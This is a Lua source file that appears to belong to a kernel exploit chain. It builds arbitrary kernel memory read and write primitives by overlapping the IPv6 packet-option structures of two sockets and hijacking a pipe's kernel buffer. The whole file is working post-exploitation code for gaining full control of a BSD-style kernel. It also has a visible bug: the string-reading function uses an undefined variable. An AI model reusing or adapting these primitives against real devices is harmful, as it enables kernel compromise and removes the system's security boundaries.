
-- class for kernel memory r/w

kernel = {}

kernel.addr = {}

-- these vars need to be defined for other fns to work properly
kernel.copyout = nil
kernel.copyin = nil
kernel.read_buffer = nil
kernel.write_buffer = nil

function kernel.read_byte(kaddr)
    local value = kernel.read_buffer(kaddr, 1)
    return value and #value == 1 and uint64.unpack(value) or nil 
end

function kernel.read_word(kaddr)
    local value = kernel.read_buffer(kaddr, 2)
    return value and #value == 2 and uint64.unpack(value) or nil 
end

function kernel.read_dword(kaddr)
    local value = kernel.read_buffer(kaddr, 4)
    return value and #value == 4 and uint64.unpack(value) or nil 
end

function kernel.read_qword(kaddr)
    local value = kernel.read_buffer(kaddr, 8)
    return value and #value == 8 and uint64.unpack(value) or nil 
end

function kernel.hex_dump(kaddr, size)
    size = size or 0x40
    return hex_dump(kernel.read_buffer(kaddr, size), kaddr)
end

function kernel.read_null_terminated_string(kaddr)
    local result = ""
    while true do
        local chunk = kernel.read_buffer(addr, 0x8)
        local null_pos = chunk:find("\0")
        if null_pos then 
            return result .. chunk:sub(1, null_pos - 1)
        end
        result = result .. chunk
        addr = addr + #chunk
    end
    return result
end

function kernel.write_byte(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,1))
end

function kernel.write_word(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,2))
end

function kernel.write_dword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,4))
end

function kernel.write_qword(dest, value)
    kernel.write_buffer(dest, ub8(value):sub(1,8))
end





-- provide fast kernel r/w through pipe pair & ipv6

ipv6_kernel_rw = {}

ipv6_kernel_rw.data = {}

function ipv6_kernel_rw.init(ofiles, kread8, kwrite8)

    ipv6_kernel_rw.ofiles = ofiles
    ipv6_kernel_rw.kread8 = kread8
    ipv6_kernel_rw.kwrite8 = kwrite8

    ipv6_kernel_rw.create_pipe_pair()
    ipv6_kernel_rw.create_overlapped_ipv6_sockets()
end

function ipv6_kernel_rw.get_fd_data_addr(fd)
    local filedescent_addr = ipv6_kernel_rw.ofiles + fd * 0x30
    local file_addr = ipv6_kernel_rw.kread8(filedescent_addr + 0x0) -- fde_file
    return ipv6_kernel_rw.kread8(file_addr + 0x0) -- f_data
end

function ipv6_kernel_rw.create_pipe_pair()

    local read_fd, write_fd = create_pipe()
    
    ipv6_kernel_rw.data.pipe_read_fd = read_fd
    ipv6_kernel_rw.data.pipe_write_fd = write_fd
    ipv6_kernel_rw.data.pipe_addr = ipv6_kernel_rw.get_fd_data_addr(read_fd)
    ipv6_kernel_rw.data.pipemap_buffer = memory.alloc(0x14)
    ipv6_kernel_rw.data.read_mem = memory.alloc(PAGE_SIZE)
end

-- overlap the pktopts of two IPV6 sockets
function ipv6_kernel_rw.create_overlapped_ipv6_sockets()

    local master_target_buffer = memory.alloc(0x14)
    local slave_buffer = memory.alloc(0x14)
    local pktinfo_size_store = memory.alloc(0x8)
    
    memory.write_qword(pktinfo_size_store, 0x14)

    local master_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()
    local victim_sock = syscall.socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP):tonumber()

    syscall.setsockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, master_target_buffer, 0x14)
    syscall.setsockopt(victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, slave_buffer, 0x14)

    local master_pcb = ipv6_kernel_rw.kread8(ipv6_kernel_rw.get_fd_data_addr(master_sock) + 0x18)
    local master_pktopts = ipv6_kernel_rw.kread8(master_pcb + 0x120)

    local slave_pcb = ipv6_kernel_rw.kread8(ipv6_kernel_rw.get_fd_data_addr(victim_sock) + 0x18)
    local slave_pktopts = ipv6_kernel_rw.kread8(slave_pcb + 0x120)

    -- magic
    ipv6_kernel_rw.kwrite8(master_pktopts + 0x10, slave_pktopts + 0x10)

    ipv6_kernel_rw.data.master_target_buffer = master_target_buffer
    ipv6_kernel_rw.data.slave_buffer = slave_buffer
    ipv6_kernel_rw.data.pktinfo_size_store = pktinfo_size_store
    ipv6_kernel_rw.data.master_sock = master_sock
    ipv6_kernel_rw.data.victim_sock = victim_sock
end

function ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.master_target_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.master_target_buffer + 0x10, 0)
    syscall.setsockopt(ipv6_kernel_rw.data.master_sock, IPPROTO_IPV6, IPV6_PKTINFO, ipv6_kernel_rw.data.master_target_buffer, 0x14)
end

function ipv6_kernel_rw.ipv6_kread(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.getsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, ipv6_kernel_rw.data.pktinfo_size_store)
end

function ipv6_kernel_rw.ipv6_kwrite(kaddr, buffer_addr)
    ipv6_kernel_rw.ipv6_write_to_victim(kaddr)
    syscall.setsockopt(ipv6_kernel_rw.data.victim_sock, IPPROTO_IPV6, IPV6_PKTINFO, buffer_addr, 0x14)
end

function ipv6_kernel_rw.ipv6_kread8(kaddr)
    ipv6_kernel_rw.ipv6_kread(kaddr, ipv6_kernel_rw.data.slave_buffer)
    return memory.read_qword(ipv6_kernel_rw.data.slave_buffer)
end

function ipv6_kernel_rw.copyout(kaddr, uaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, uint64("0x4000000040000000"))
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)
    
    syscall.read(ipv6_kernel_rw.data.pipe_read_fd, uaddr, len)
end

function ipv6_kernel_rw.copyin(uaddr, kaddr, len)

    assert(kaddr and uaddr and len)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, 0)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, uint64("0x4000000000000000"))
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr, ipv6_kernel_rw.data.pipemap_buffer)

    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer, kaddr)
    memory.write_qword(ipv6_kernel_rw.data.pipemap_buffer + 0x8, 0)
    memory.write_dword(ipv6_kernel_rw.data.pipemap_buffer + 0x10, 0)
    ipv6_kernel_rw.ipv6_kwrite(ipv6_kernel_rw.data.pipe_addr + 0x10, ipv6_kernel_rw.data.pipemap_buffer)

    syscall.write(ipv6_kernel_rw.data.pipe_write_fd, uaddr, len)
end

function ipv6_kernel_rw.read_buffer(kaddr, len)

    local mem = ipv6_kernel_rw.data.read_mem
    if len > PAGE_SIZE then
        mem = memory.alloc(len)
    end

    ipv6_kernel_rw.copyout(kaddr, mem, len)
    return memory.read_buffer(mem, len)
end

function ipv6_kernel_rw.write_buffer(kaddr, buf)
    ipv6_kernel_rw.copyin(lua.resolve_value(buf), kaddr, #buf)
end